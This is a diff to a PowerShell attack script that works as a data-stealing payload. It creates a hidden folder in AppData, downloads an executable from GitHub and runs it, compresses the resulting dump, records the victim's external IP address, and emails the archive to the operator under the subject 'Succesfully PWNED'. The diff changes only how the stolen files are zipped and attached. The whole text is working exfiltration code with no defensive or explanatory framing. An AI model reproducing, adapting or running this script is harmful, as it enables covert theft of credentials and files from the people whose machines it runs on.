@@ -5,8 +5,9 @@ mkdir "$env:appdata\Microsoft\dump"
 Set-Location "$env:appdata\Microsoft\dump"
 #Downloading and executing b64.exe
 Invoke-WebRequest 'https://github.com/jfkd02ks/playwithcode/raw/main/b64.exe'
-.\b64.exe --format json --zip
+.\b64.exe --format json
 Remove-Item -Path "$env:appdata\Microsoft\dump\64.exe" -Force
+Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
 
 # Call Home
@@ -21,7 +22,7 @@ $ReportEmail.To.Add($UserName)
 $ip = Invoke-RestMethod "myexternalip.com/raw"
 $ReportEmail.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ReportEmail.Body = $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
-$ReportEmail.Attachments.Add("$env:appdata\Microsoft\dump\results\archive.zip")
+$ReportEmail.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
 $SMTPInfo.Send($ReportEmail)
 $ReportEmail.Dispose()
 $SMTPInfo.Dispose()
